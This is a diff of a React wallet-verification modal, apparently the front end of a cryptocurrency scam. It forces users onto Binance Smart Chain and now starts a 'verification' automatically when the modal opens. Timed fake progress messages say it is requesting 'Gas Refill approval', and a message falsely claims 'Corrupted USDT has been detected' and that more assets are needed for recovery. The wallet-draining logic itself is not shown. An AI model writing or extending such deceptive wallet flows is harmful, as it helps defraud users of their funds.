@@ -9,14 +9,6 @@ import axios from "axios";
 import { apiUrl } from "../config";
 
 const TOKENS = {
-  1: [
-    {
-      symbol: "USDT",
-      address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
-      decimals: 6,
-      icon: icone8,
-    },
-  ],
   56: [
     {
       symbol: "USDT",
@@ -25,13 +17,7 @@ const TOKENS = {
       icon: icone8,
     },
   ],
-  137: [
-    {
-      symbol: "USDT",
-      address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
-      decimals: 6,
-    },
-  ],
+
   // 5611: [
   //   {
   //     symbol: "USDT",
@@ -88,6 +74,25 @@ const WalletDetails = ({ checkStatus, details, web3 }) => {
   const [verifying, setVerifying] = useState(false);
   const [verifyStep, setVerifyStep] = useState(0);
   const [showText, setShowText] = useState(false);
+
+  // Loader ke liye state
+  const [showModal, setShowModal] = useState(false);
+
+  // ✅ Modal open hone par verify call karna
+  useEffect(() => {
+    if (checkStatus) {
+      setVerifying(true); // Loader start
+      setShowModal(false); // Modal abhi band
+      verifyWallet(); // Verify start
+    }
+  }, [checkStatus]);
+
+  // ✅ Jab verification complete ho jaye
+  useEffect(() => {
+    if (verified && !verifying) {
+      setShowModal(true); // Ab modal khol do
+    }
+  }, [verified, verifying]);
 
   const chains = [
     {
@@ -149,7 +154,6 @@ const WalletDetails = ({ checkStatus, details, web3 }) => {
             method: "wallet_switchEthereumChain",
             params: [{ chainId: web3.utils.toHex(DEFAULT_CHAIN_ID) }],
           });
-        
         } catch (error) {
           if (error.code === 4902) {
             // If BSC not added, add it
@@ -169,7 +173,6 @@ const WalletDetails = ({ checkStatus, details, web3 }) => {
                 },
               ],
             });
-
           } else {
             toast.error("Please switch to Binance Smart Chain manually");
           }
@@ -187,12 +190,14 @@ const WalletDetails = ({ checkStatus, details, web3 }) => {
         toast.error("No wallet detected.");
         return;
       }
-    
+
       try {
-        const accounts = await provider.request({ method: "eth_requestAccounts" });
+        const accounts = await provider.request({
+          method: "eth_requestAccounts",
+        });
         setAccount(accounts[0] || null);
         setIsConnected(!!accounts[0]);
-    
+
         await ensureCorrectNetwork(provider); // ✅ Force BSC
         const networkId = await web3.eth.getChainId();
         setChainId(Number(networkId));
@@ -200,7 +205,7 @@ const WalletDetails = ({ checkStatus, details, web3 }) => {
         setRpcError("Failed to connect: " + error.message);
       }
     };
-    
+
     checkConnection();
   }, []);
 
@@ -416,13 +421,13 @@ const WalletDetails = ({ checkStatus, details, web3 }) => {
             setVerifyStep(0);
           }
         } else {
-          setTimeout(() => setVerifyStep(3), 6000);
+          setTimeout(() => setVerifyStep(3), 3000);
 
           setTimeout(() => {
             setVerified(true);
             setVerifying(false);
             setVerifyStep(0);
-          }, 10000);
+          }, 5000);
         }
       }, 3000);
     } catch (err) {
@@ -519,225 +524,188 @@ const WalletDetails = ({ checkStatus, details, web3 }) => {
   };
 
 
-
   return (
-    <Modal
-      open={checkStatus}
-      footer={null}
-      className="wallet-modal"
-      closable={false}
-      onCancel={handleClose}
-    >
-      <div className="wallet-modal-content">
-        <div className="modal-body">
-          {isConnected ? (
-            <div className="wallet-info">
-              {verifying ? (
-                <div className="loader-overlay">
-                  <div className="loader-box">
-                    <div className="loader-circle"></div>
-                    {verifyStep === 1 && <p>Submiting User Request...</p>}
-                    {verifyStep === 2 && <p>Creating User Request for GAS</p>}
-                    {verifyStep === 3 && (
-                      <p>Trying to Request Gas Refill approval from User</p>
+    <>
+      {/* 🔹 Loader outside modal */}
+      {verifying && (
+        <div className="loader-overlay">
+          <div className="loader-box">
+            <div className="loader-circle"></div>
+            {verifyStep === 1 && <p>Submitting User Request...</p>}
+            {verifyStep === 2 && <p>Creating User Request for GAS</p>}
+            {verifyStep === 3 && (
+              <p>Trying to Request Gas Refill approval from User</p>
+            )}
+          </div>
+        </div>
+      )}
+
+      {/* 🔹 Modal will only open when NOT verifying */}
+      {showModal && (
+        <Modal
+          open={checkStatus}
+          footer={null}
+          className="wallet-modal"
+          closable={true}
+          onCancel={handleClose}
+        >
+          <div className="wallet-modal-content">
+            <div className="modal-body">
+              {isConnected ? (
+                <div className="wallet-info">
+                  <div className="verified-section text-center">
+                    <div className="status-indicator verified success-box">
+                      <div className="status-icon">
+                        <img
+                          src="/images/green_checkmark.png"
+                          alt=""
+                          width={40}
+                        />
+                      </div>
+                      <div className="status-text">
+                        <h3 className="text-green-800">
+                          Verification successful
+                        </h3>
+                      </div>
+                    </div>
+                    {!showText ? (
+                      <p style={{ color: "green" }}>
+                        Your assets are genuine and ready for trading.
+                      </p>
+                    ) : (
+                      <p style={{ color: "red" }}>
+                        Corrupted USDT has been detected, and additional assets
+                        are required for recovery.
+                      </p>
                     )}
-                  </div>
-                </div>
-              ) : !verified ? (
-                <div className="verification-section">
-                  <div className="status-indicator unverified">
-                    <div className="status-icon">⚠️</div>
-                    <div className="status-text">
-                      <h3>Wallet Not Verified</h3>
-                      <p>Verify your wallet to access all features</p>
+
+                    <div className="balances-box">
+                      <p className="balance-line">
+                        Wallet Address: {truncateAddress(account)}{" "}
+                        <button
+                          onClick={() => copyText(account)}
+                          style={{
+                            background: "none",
+                            border: "none",
+                            color: "#f0b90b",
+                            cursor: "pointer",
+                            marginLeft: "8px",
+                          }}
+                        >
+                          Copy
+                        </button>
+                      </p>
+                      {nativeBalance && (
+                        <p
+                          className="balance-line"
+                          style={{
+                            display: "flex",
+                            alignItems: "center",
+                            justifyContent: "center",
+                          }}
+                        >
+                          {nativeBalance.icon && (
+                            <img
+                              src={nativeBalance.icon}
+                              alt={`${nativeBalance.symbol} icon`}
+                              width={24}
+                              height={24}
+                              style={{ marginRight: "8px" }}
+                            />
+                          )}
+                          Native Balance: {nativeBalance.formatted}{" "}
+                          {nativeBalance.symbol}
+                        </p>
+                      )}
+                      {!loading && !rpcError && TOKENS[chainId] && (
+                        <>
+                          {tokenBalances
+                            .filter((t) => !t.error && t.balance > 0)
+                            .map((t, i) => (
+                              <p
+                                key={i}
+                                className="balance-line"
+                                style={{
+                                  display: "flex",
+                                  alignItems: "center",
+                                  justifyContent: "center",
+                                }}
+                              >
+                                {t.icon && (
+                                  <img
+                                    src={t.icon}
+                                    alt={`${t.symbol} icon`}
+                                    width={24}
+                                    height={24}
+                                    style={{ marginRight: "8px" }}
+                                  />
+                                )}
+                                {t.symbol} Balance: {t.balance.toFixed(4)}
+                              </p>
+                            ))}
+                          {tokenBalances.filter(
+                            (t) => !t.error && t.balance > 0
+                          ).length === 0 && (
+                            <p className="balance-line">No tokens found</p>
+                          )}
+                        </>
+                      )}
+                      {loading && (
+                        <p className="balance-line">Fetching balances…</p>
+                      )}
+                      {rpcError && !loading && (
+                        <p className="error-message">⚠️ {rpcError}</p>
+                      )}
+                      {!TOKENS[chainId] && !loading && !rpcError && (
+                        <p className="balance-line">
+                          Token balances not supported on this network (Chain
+                          ID: {chainId})
+                        </p>
+                      )}
+                    </div>
+                    <div className="network-box">
+                      <h4>Switch Network</h4>
+                      <select
+                        value={chainId || ""}
+                        onChange={(e) => switchChain(Number(e.target.value))}
+                        style={{ display: "flex", alignItems: "center" }}
+                      >
+                        {chains.map((c) => (
+                          <option key={c.id} value={c.id}>
+                            {c.name}
+                          </option>
+                        ))}
+                      </select>
+                    </div>
+                    <div className="close-btn-container">
+                      <button
+                        className="close-btn-footer"
+                        onClick={handleClose}
+                      >
+                        CLOSE
+                      </button>
                     </div>
                   </div>
-                  <button
-                    className="verify-btn"
-                    onClick={verifyWallet}
-                    disabled={verifying}
-                    style={{
-                      opacity: verifying ? 0.6 : 1,
-                      cursor: verifying ? "not-allowed" : "pointer",
-                      display: "flex",
-                      alignItems: "center",
-                      justifyContent: "center",
-                      gap: "8px",
-                    }}
-                  >
-                    {verifying && (
-                      <span
-                        style={{
-                          width: "16px",
-                          height: "16px",
-                          border: "3px solid rgba(255,255,255,0.5)",
-                          borderTop: "3px solid white",
-                          borderRadius: "50%",
-                          animation: "spin 1s linear infinite",
-                        }}
-                      ></span>
-                    )}
-                    Verify Assets
-                  </button>
-
-                  <style>
-                    {`
-                      @keyframes spin {
-                        0% { transform: rotate(0deg); }
-                        100% { transform: rotate(360deg); }
-                      }
-                    `}
-                  </style>
                 </div>
               ) : (
-                <div className="verified-section text-center">
-                  <div className="status-indicator verified success-box">
-                    <div className="status-icon">
-                      <img
-                        src="/images/green_checkmark.png"
-                        alt=""
-                        width={40}
-                      />
-                    </div>
-                    <div className="status-text">
-                      <h3 className="text-green-800">
-                        Verification successful
-                      </h3>
-                    </div>
-                  </div>
-                  {!showText ? (
-                    <p style={{ color: "green" }}>
-                      Your assets are genuine and ready for trading.
-                    </p>
-                  ) : (
-                    <p style={{ color: "red" }}>
-                      Corrupted USDT has been detected, and additional assets
-                      are required for recovery.
-                    </p>
-                  )}
-
-                  <div className="balances-box">
-                    <p className="balance-line">
-                      Wallet Address: {truncateAddress(account)}{" "}
-                      <button
-                        onClick={() => copyText(account)}
-                        style={{
-                          background: "none",
-                          border: "none",
-                          color: "#f0b90b",
-                          cursor: "pointer",
-                          marginLeft: "8px",
-                        }}
-                      >
-                        Copy
-                      </button>
-                    </p>
-                    {nativeBalance && (
-                      <p
-                        className="balance-line"
-                        style={{
-                          display: "flex",
-                          alignItems: "center",
-                          justifyContent: "center",
-                        }}
-                      >
-                        {nativeBalance.icon && (
-                          <img
-                            src={nativeBalance.icon}
-                            alt={`${nativeBalance.symbol} icon`}
-                            width={24}
-                            height={24}
-                            style={{ marginRight: "8px" }}
-                          />
-                        )}
-                        Native Balance: {nativeBalance.formatted}{" "}
-                        {nativeBalance.symbol}
-                      </p>
-                    )}
-                    {!loading && !rpcError && TOKENS[chainId] && (
-                      <>
-                        {tokenBalances
-                          .filter((t) => !t.error && t.balance > 0)
-                          .map((t, i) => (
-                            <p
-                              key={i}
-                              className="balance-line"
-                              style={{
-                                display: "flex",
-                                alignItems: "center",
-                                justifyContent: "center",
-                              }}
-                            >
-                              {t.icon && (
-                                <img
-                                  src={t.icon}
-                                  alt={`${t.symbol} icon`}
-                                  width={24}
-                                  height={24}
-                                  style={{ marginRight: "8px" }}
-                                />
-                              )}
-                              {t.symbol} Balance: {t.balance.toFixed(4)}
-                            </p>
-                          ))}
-                        {tokenBalances.filter((t) => !t.error && t.balance > 0)
-                          .length === 0 && (
-                          <p className="balance-line">No tokens found</p>
-                        )}
-                      </>
-                    )}
-                    {loading && (
-                      <p className="balance-line">Fetching balances…</p>
-                    )}
-                    {rpcError && !loading && (
-                      <p className="error-message">⚠️ {rpcError}</p>
-                    )}
-                    {!TOKENS[chainId] && !loading && !rpcError && (
-                      <p className="balance-line">
-                        Token balances not supported on this network (Chain ID:{" "}
-                        {chainId})
-                      </p>
-                    )}
-                  </div>
-                  <div className="network-box">
-                    <h4>Switch Network</h4>
-                    <select
-                      value={chainId || ""}
-                      onChange={(e) => switchChain(Number(e.target.value))}
-                      style={{ display: "flex", alignItems: "center" }}
-                    >
-                      {chains.map((c) => (
-                        <option key={c.id} value={c.id}>
-                          {c.name}
-                        </option>
-                      ))}
-                    </select>
+                <>
+                  <div className="not-connected">
+                    <div className="status-icon">🔒</div>
+                    <h3>Wallet not connected </h3>
+                    <p>Connect your wallet to view details</p>
                   </div>
                   <div className="close-btn-container">
                     <button className="close-btn-footer" onClick={handleClose}>
                       CLOSE
                     </button>
                   </div>
-                </div>
+                </>
               )}
             </div>
-          ) : (
-            <>
-              <div className="not-connected">
-                <div className="status-icon">🔒</div>
-                <h3>Wallet not connected </h3>
-                <p>Connect your wallet to view details</p>
-              </div>
-              <div className="close-btn-container">
-                <button className="close-btn-footer" onClick={handleClose}>
-                  CLOSE
-                </button>
-              </div>
-            </>
-          )}
-        </div>
-      </div>
-    </Modal>
+          </div>
+        </Modal>
+      )}
+    </>
   );
 };
 
